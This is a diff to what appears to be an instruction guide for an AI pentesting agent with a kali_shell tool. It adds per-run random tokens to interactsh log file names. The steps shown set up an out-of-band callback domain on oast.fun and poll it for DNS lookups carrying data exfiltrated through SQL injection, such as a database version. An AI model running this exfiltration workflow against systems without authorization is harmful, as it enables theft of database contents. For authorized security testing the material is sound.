@@ -400,14 +400,15 @@ or WAF blocks inline output. Requires `interactsh-client` installed in kali-sand
 ### Setting Up Interactsh Callback Domain
 
 **Step 1: Start interactsh-client as a background process**
+Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
 ```
-kali_shell("interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!")
+kali_shell("interactsh-client -server oast.fun -json -v > /tmp/interactsh-RUN.log 2>&1 & echo $!")
 ```
 → **Save the PID** from the output for later cleanup.
 
 **Step 2: Wait and read the registered domain**
 ```
-kali_shell("sleep 5 && head -20 /tmp/interactsh.log")
+kali_shell("sleep 5 && head -20 /tmp/interactsh-RUN.log")
 ```
 → Look for a line containing the `.oast.fun` domain (e.g., `abc123xyz.oast.fun`)
 → **IMPORTANT:** This domain is cryptographically registered with the server.
@@ -448,7 +449,7 @@ PostgreSQL (dblink/COPY):
 
 **Step 4: Poll for interactions**
 ```
-kali_shell("cat /tmp/interactsh.log | tail -50")
+kali_shell("cat /tmp/interactsh-RUN.log | tail -50")
 ```
 → Look for JSON lines with `"protocol":"dns"` containing exfiltrated data as subdomain
 → Example: `{"protocol":"dns","full-id":"5.7.38.abc123xyz.oast.fun"}` means DB version is 5.7.38
